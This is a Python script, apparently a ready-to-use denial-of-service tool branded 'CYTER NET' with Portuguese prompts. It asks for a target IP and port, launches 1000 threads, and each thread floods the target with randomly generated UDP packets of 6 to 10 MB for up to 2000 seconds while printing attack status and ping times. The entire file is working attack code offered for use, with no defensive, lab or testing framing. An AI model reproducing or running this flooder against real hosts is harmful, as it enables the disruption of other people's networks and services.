import signal
import time
import socket
import random
import threading
import sys
import os
from os import system, name
from pyfiglet import figlet_format
from colorama import Fore, init
import subprocess

# Initialize Colorama
init(autoreset=True)

# Lock to synchronize thread output
print_lock = threading.Lock()

def print_banner():
    os.system('clear' if name != 'nt' else 'cls')
    banner = figlet_format("CYTER NET", font="big")
    print(Fore.YELLOW + banner)

def clear_screen():
    os.system('clear' if name != 'nt' else 'cls')

def print_attack_status(ip, port, protocol, ping, sent_packets):
    with print_lock:
        print(Fore.YELLOW + f"[Cyter] Atack enviado: \033[0m{ip}:{port} - {protocol} \033[93m| Ping: \033[0m{ping}")

def get_ping(ip):
    try:
        output = subprocess.check_output(
            ['ping', '-c', '1', ip] if name != 'nt' else ['ping', '-n', '1', ip],
            stderr=subprocess.STDOUT,
            universal_newlines=True
        )
        time_ms = output.split('time=')[-1].split('ms')[0]
        return time_ms
    except subprocess.CalledProcessError:
        return '+999'
    except Exception as e:
        return f'Erro: {str(e)}'

def udp_flood(ip, port, duration=2000, min_size_mb=6, max_size_mb=10):
    sent_packets = 0
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                addr = (ip, port)
                data_size = random.randint(min_size_mb * 1024 * 1024, max_size_mb * 1024 * 1024)  # Size between min_size_mb and max_size_mb MB
                data = random._urandom(data_size)
                s.sendto(data, addr)
                sent_packets += 1
                ping = get_ping(ip)
                print_attack_status(ip, port, 'UDP', ping, sent_packets)
                time.sleep(random.uniform(0.01, 0.05))  # Random short pause
        except Exception as e:
            with print_lock:
                print(Fore.RED + f"[ERROR] {str(e)}")

def main():
    print_banner()

    ip = input(Fore.YELLOW + "\033[96mEndereço/Ip: \033[0m").strip()
    port = int(input(Fore.YELLOW + "\033[96mPort: \033[0m").strip())

    threads = []
    for _ in range(1000):  # Define o número de threads para 1000
        thread = threading.Thread(target=udp_flood, args=(ip, port))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

def exit_gracefully(signum, frame):
    clear_screen()
    print(Fore.GREEN + "Saindo... Obrigado por usar o script.")
    sys.exit(0)

if __name__ == '__main__':
    signal.signal(signal.SIGINT, exit_gracefully)
    main()
